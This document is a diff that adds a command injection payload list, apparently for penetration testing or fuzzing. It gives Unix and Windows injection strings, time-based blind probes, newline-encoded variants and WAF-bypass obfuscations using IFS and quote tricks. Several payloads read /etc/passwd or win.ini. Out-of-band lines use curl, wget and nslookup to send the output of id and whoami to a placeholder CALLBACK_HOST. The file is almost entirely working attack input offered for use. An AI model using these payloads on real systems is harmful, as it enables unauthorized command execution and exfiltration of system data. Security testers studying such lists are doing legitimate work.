@@ -1,0 +1,89 @@
+# Command Injection Payloads
+# One payload per line
+
+# ========================
+# Basic Command Injection
+# ========================
+;id
+;whoami
+;ls
+;cat /etc/passwd
+|id
+|whoami
+||id
+&id
+&&id
+`id`
+$(id)
+;id;
+|id|
+&id&
+
+# ========================
+# Windows Command Injection
+# ========================
+;dir
+|dir
+&dir
+&&dir
+;whoami
+|whoami
+&whoami
+&&whoami
+;type C:\Windows\win.ini
+|type C:\Windows\win.ini
+
+# ========================
+# Time-Based Blind Detection
+# ========================
+;sleep 5
+|sleep 5
+||sleep 5
+&sleep 5
+&&sleep 5
+`sleep 5`
+$(sleep 5)
+;sleep 5;
+; sleep 5 #
+; ping -c 5 127.0.0.1
+
+# Windows time-based
+;timeout 5
+|timeout 5
+&timeout 5
+&&timeout 5
+; ping -n 5 127.0.0.1
+
+# ========================
+# Newline Injection
+# ========================
+%0a id
+%0a whoami
+%0a cat /etc/passwd
+%0d%0a id
+
+# ========================
+# WAF Bypass
+# ========================
+;i'`d`
+;wh$()oami
+;who$IFS$9ami
+${IFS}id
+;{id}
+;$IFS id
+a;${IFS}id
+a;${IFS}whoami
+;ca${t}${IFS}/etc/pass${wd}
+
+# ========================
+# Out-of-Band (OOB) Detection
+# Use your own DNS/HTTP server for detection
+# Replace CALLBACK_HOST with your server
+# ========================
+;nslookup CALLBACK_HOST
+;curl http://CALLBACK_HOST/?x=$(id)
+;wget http://CALLBACK_HOST/?x=$(whoami)
+;ping -c 1 CALLBACK_HOST
+$(nslookup CALLBACK_HOST)
+`nslookup CALLBACK_HOST`
+|nslookup CALLBACK_HOST
